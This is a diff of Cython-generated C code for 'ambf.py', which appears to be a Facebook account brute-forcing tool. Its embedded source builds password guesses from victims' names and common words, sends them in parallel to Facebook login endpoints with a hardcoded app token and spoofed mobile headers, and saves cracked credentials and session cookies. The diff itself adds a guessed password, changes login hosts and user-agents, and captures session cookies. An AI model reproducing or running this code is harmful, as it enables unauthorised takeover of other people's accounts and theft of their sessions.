                   __Pyx_INCREF(__pyx_v_name);
                   __Pyx_GIVEREF(__pyx_v_name);
@@ -12891,6 +12883,9 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   PyList_SET_ITEM(__pyx_t_7, 1, __pyx_t_13);
                   __Pyx_GIVEREF(__pyx_t_4);
                   PyList_SET_ITEM(__pyx_t_7, 2, __pyx_t_4);
+                  __Pyx_INCREF(__pyx_n_s_sayang);
+                  __Pyx_GIVEREF(__pyx_n_s_sayang);
+                  PyList_SET_ITEM(__pyx_t_7, 3, __pyx_n_s_sayang);
                   __pyx_t_13 = 0;
                   __pyx_t_4 = 0;
                   __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_7));
@@ -12900,14 +12895,14 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 					uid, name = user.split("<=>")
  * 					ss = name.split(" ")
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:             # <<<<<<<<<<<<<<
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  * 					else:
  */
                   goto __pyx_L139;
                 }
 
                 /* "ambf.py":422
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  * 					else:
  * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]             # <<<<<<<<<<<<<<
  * 					coeg.submit(crack, uid, pwx, "https://m.facebook.com")
@@ -13115,7 +13110,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
       __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
 
       /* "ambf.py":413
- * 					coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")
+ * 					coeg.submit(crack, uid, pwx, "https://d.facebook.com")
  * 			exit("\n\n [#] crack selesai...")
  * 		elif method in ["3", "03"]:             # <<<<<<<<<<<<<<
  * 			with ThreadPoolExecutor(max_workers=30) as coeg:
@@ -13318,7 +13313,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 	try:
  * 		ua = open(".ua", "r").read()             # <<<<<<<<<<<<<<
  * 	except IOError:
- * 		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
+ * 		ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  */
       __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 430, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_5);
@@ -13364,7 +13359,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 	try:
  * 		ua = open(".ua", "r").read()
  * 	except IOError:             # <<<<<<<<<<<<<<
- * 		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
+ * 		ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  * 	global ok, cp, loop, token
  */
     __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
@@ -13378,12 +13373,12 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
       /* "ambf.py":432
  * 		ua = open(".ua", "r").read()
  * 	except IOError:
- * 		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")             # <<<<<<<<<<<<<<
+ * 		ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")             # <<<<<<<<<<<<<<
  * 	global ok, cp, loop, token
  * 	sys.stdout.write(
  */
-      __Pyx_INCREF(__pyx_kp_s_NokiaC3_00_5_0_07_20_Profile_MID);
-      __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_kp_s_NokiaC3_00_5_0_07_20_Profile_MID);
+      __Pyx_INCREF(__pyx_kp_s_FBAN_FB4A_FBAV_276_0_0_44_127_F);
+      __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_kp_s_FBAN_FB4A_FBAV_276_0_0_44_127_F);
       __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
       __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
       __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
@@ -13413,7 +13408,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
   }
 
   /* "ambf.py":434
- * 		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
+ * 		ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  * 	global ok, cp, loop, token
  * 	sys.stdout.write(             # <<<<<<<<<<<<<<
  * 		"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
@@ -13689,7 +13684,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
  * 		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)             # <<<<<<<<<<<<<<
  * 		if "session_key" in send.text and "EAAA" in send.text:
- * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["session_cookies"]))
  */
     __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 441, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_6);
@@ -13730,7 +13725,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
  * 		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
  * 		if "session_key" in send.text and "EAAA" in send.text:             # <<<<<<<<<<<<<<
- * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["session_cookies"]))
  * 			ok.append("%s|%s"%(uid, pw))
  */
     __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_send, __pyx_n_s_text); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 442, __pyx_L1_error)
@@ -13755,7 +13750,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
       /* "ambf.py":443
  * 		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
  * 		if "session_key" in send.text and "EAAA" in send.text:
- * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))             # <<<<<<<<<<<<<<
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["session_cookies"]))             # <<<<<<<<<<<<<<
  * 			ok.append("%s|%s"%(uid, pw))
  * 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
  */
@@ -13776,7 +13771,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
       if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 443, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_11);
       __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-      __pyx_t_12 = __Pyx_PyObject_Dict_GetItem(__pyx_t_11, __pyx_n_s_access_token); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 443, __pyx_L1_error)
+      __pyx_t_12 = __Pyx_PyObject_Dict_GetItem(__pyx_t_11, __pyx_n_s_session_cookies); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 443, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_12);
       __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
       __pyx_t_11 = PyTuple_New(3); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 443, __pyx_L1_error)
@@ -13798,7 +13793,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
 
       /* "ambf.py":444
  * 		if "session_key" in send.text and "EAAA" in send.text:
- * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["session_cookies"]))
  * 			ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
  * 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
  * 			break
@@ -13821,7 +13816,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
       __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
 
       /* "ambf.py":445
- * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["session_cookies"]))
  * 			ok.append("%s|%s"%(uid, pw))
  * 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
  * 			break
@@ -13888,7 +13883,7 @@ static PyObject *__pyx_pf_4ambf_22api(CYTHON_UNUSED PyObject *__pyx_self, PyObje
  * 		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
  * 		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
  * 		if "session_key" in send.text and "EAAA" in send.text:             # <<<<<<<<<<<<<<
- * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+ * 			print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["session_cookies"]))
  * 			ok.append("%s|%s"%(uid, pw))
  */
     }
@@ -14819,7 +14814,6 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
   PyObject *__pyx_v_month = NULL;
   PyObject *__pyx_v_day = NULL;
   PyObject *__pyx_v_year = NULL;
-  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;
   PyObject *__pyx_v_key = NULL;
   PyObject *__pyx_v_value = NULL;
   PyObject *__pyx_r = NULL;
@@ -14840,18 +14834,15 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
   PyObject *__pyx_t_14 = NULL;
   Py_ssize_t __pyx_t_15;
   PyObject *(*__pyx_t_16)(PyObject *);
-  PyObject *__pyx_t_17 = NULL;
-  PyObject *__pyx_t_18 = NULL;
-  PyObject *__pyx_t_19 = NULL;
+  int __pyx_t_17;
+  int __pyx_t_18;
+  PyObject *(*__pyx_t_19)(PyObject *);
   int __pyx_t_20;
-  int __pyx_t_21;
-  PyObject *(*__pyx_t_22)(PyObject *);
-  int __pyx_t_23;
+  PyObject *__pyx_t_21 = NULL;
+  PyObject *__pyx_t_22 = NULL;
+  PyObject *__pyx_t_23 = NULL;
   PyObject *__pyx_t_24 = NULL;
   PyObject *__pyx_t_25 = NULL;
-  PyObject *__pyx_t_26 = NULL;
-  PyObject *__pyx_t_27 = NULL;
-  PyObject *__pyx_t_28 = NULL;
   int __pyx_lineno = 0;
   const char *__pyx_filename = NULL;
   int __pyx_clineno = 0;
@@ -14879,7 +14870,7 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 	try:
  * 		ua = open(".ua", "r").read()             # <<<<<<<<<<<<<<
  * 	except IOError:
- * 		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
+ * 		ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  */
       __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 474, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_5);
@@ -14925,7 +14916,7 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 	try:
  * 		ua = open(".ua", "r").read()
  * 	except IOError:             # <<<<<<<<<<<<<<
- * 		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
+ * 		ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  * 	global ok, cp, loop, token
  */
     __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
@@ -14939,12 +14930,12 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
       /* "ambf.py":476
  * 		ua = open(".ua", "r").read()
  * 	except IOError:
- * 		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")             # <<<<<<<<<<<<<<
+ * 		ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")             # <<<<<<<<<<<<<<
  * 	global ok, cp, loop, token
  * 	sys.stdout.write(
  */
-      __Pyx_INCREF(__pyx_kp_s_NokiaC3_00_5_0_07_20_Profile_MID);
-      __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_kp_s_NokiaC3_00_5_0_07_20_Profile_MID);
+      __Pyx_INCREF(__pyx_kp_s_FBAN_FB4A_FBAV_276_0_0_44_127_F);
+      __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_kp_s_FBAN_FB4A_FBAV_276_0_0_44_127_F);
       __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
       __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
       __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
@@ -14974,7 +14965,7 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
   }
 
   /* "ambf.py":478
- * 		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
+ * 		ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  * 	global ok, cp, loop, token
  * 	sys.stdout.write(             # <<<<<<<<<<<<<<
  * 		"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
@@ -14994,7 +14985,7 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 	sys.stdout.write(
  * 		"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))             # <<<<<<<<<<<<<<
  * 	); sys.stdout.flush()
- * 	try:
+ * 	for pw in pwx:
  */
   __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_loop); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
@@ -15055,8 +15046,8 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 	sys.stdout.write(
  * 		"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
  * 	); sys.stdout.flush()             # <<<<<<<<<<<<<<
- * 	try:
- * 		for pw in pwx:
+ * 	for pw in pwx:
+ * 		kwargs = {}
  */
   __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_sys); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 480, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
@@ -15086,944 +15077,1042 @@ static PyObject *__pyx_pf_4ambf_24crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
   /* "ambf.py":481
  * 		"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
  * 	); sys.stdout.flush()
- * 	try:             # <<<<<<<<<<<<<<
- * 		for pw in pwx:
- * 			kwargs = {}
+ * 	for pw in pwx:             # <<<<<<<<<<<<<<
+ * 		kwargs = {}
+ * 		pw = pw.lower()
  */
-  {
-    __Pyx_PyThreadState_declare
-    __Pyx_PyThreadState_assign
-    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
-    __Pyx_XGOTREF(__pyx_t_3);
-    __Pyx_XGOTREF(__pyx_t_2);
-    __Pyx_XGOTREF(__pyx_t_1);
-    /*try:*/ {
-
-      /* "ambf.py":482
- * 	); sys.stdout.flush()
- * 	try:
- * 		for pw in pwx:             # <<<<<<<<<<<<<<
- * 			kwargs = {}
- * 			pw = pw.lower()
- */
-      if (likely(PyList_CheckExact(__pyx_v_pwx)) || PyTuple_CheckExact(__pyx_v_pwx)) {
-        __pyx_t_5 = __pyx_v_pwx; __Pyx_INCREF(__pyx_t_5); __pyx_t_9 = 0;
-        __pyx_t_13 = NULL;
+  if (likely(PyList_CheckExact(__pyx_v_pwx)) || PyTuple_CheckExact(__pyx_v_pwx)) {
+    __pyx_t_5 = __pyx_v_pwx; __Pyx_INCREF(__pyx_t_5); __pyx_t_9 = 0;
+    __pyx_t_13 = NULL;
+  } else {
+    __pyx_t_9 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_v_pwx); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 481, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_5);
+    __pyx_t_13 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 481, __pyx_L1_error)
+  }
+  for (;;) {
+    if (likely(!__pyx_t_13)) {
+      if (likely(PyList_CheckExact(__pyx_t_5))) {
+        if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_5)) break;
+        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
+        __pyx_t_6 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_9); __Pyx_INCREF(__pyx_t_6); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 481, __pyx_L1_error)
+        #else
+        __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 481, __pyx_L1_error)
+        __Pyx_GOTREF(__pyx_t_6);
+        #endif
       } else {
-        __pyx_t_9 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_v_pwx); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 482, __pyx_L11_error)
-        __Pyx_GOTREF(__pyx_t_5);
-        __pyx_t_13 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 482, __pyx_L11_error)
+        if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
+        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
+        __pyx_t_6 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_9); __Pyx_INCREF(__pyx_t_6); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 481, __pyx_L1_error)
+        #else
+        __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 481, __pyx_L1_error)
+        __Pyx_GOTREF(__pyx_t_6);
+        #endif
       }
+    } else {
+      __pyx_t_6 = __pyx_t_13(__pyx_t_5);
+      if (unlikely(!__pyx_t_6)) {
+        PyObject* exc_type = PyErr_Occurred();
+        if (exc_type) {
+          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
+          else __PYX_ERR(0, 481, __pyx_L1_error)
+        }
+        break;
+      }
+      __Pyx_GOTREF(__pyx_t_6);
+    }
+    __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_6);
+    __pyx_t_6 = 0;
+
+    /* "ambf.py":482
+ * 	); sys.stdout.flush()
+ * 	for pw in pwx:
+ * 		kwargs = {}             # <<<<<<<<<<<<<<
+ * 		pw = pw.lower()
+ * 		ses = requests.Session()
+ */
+    __pyx_t_6 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 482, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    __Pyx_DECREF_SET(__pyx_v_kwargs, ((PyObject*)__pyx_t_6));
+    __pyx_t_6 = 0;
+
+    /* "ambf.py":483
+ * 	for pw in pwx:
+ * 		kwargs = {}
+ * 		pw = pw.lower()             # <<<<<<<<<<<<<<
+ * 		ses = requests.Session()
+ * 		ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+ */
+    __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_lower); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 483, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
+    __pyx_t_12 = NULL;
+    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
+      __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_11);
+      if (likely(__pyx_t_12)) {
+        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
+        __Pyx_INCREF(__pyx_t_12);
+        __Pyx_INCREF(function);
+        __Pyx_DECREF_SET(__pyx_t_11, function);
+      }
+    }
+    __pyx_t_6 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
+    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 483, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_6);
+    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+    __Pyx_DECREF_SET(__pyx_v_pw, __pyx_t_6);
+    __pyx_t_6 = 0;
+
+    /* "ambf.py":484
+ * 		kwargs = {}
+ * 		pw = pw.lower()
+ * 		ses = requests.Session()             # <<<<<<<<<<<<<<
+ * 		ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+ * 		p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
+ */
+    __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_requests); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 484, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_11);
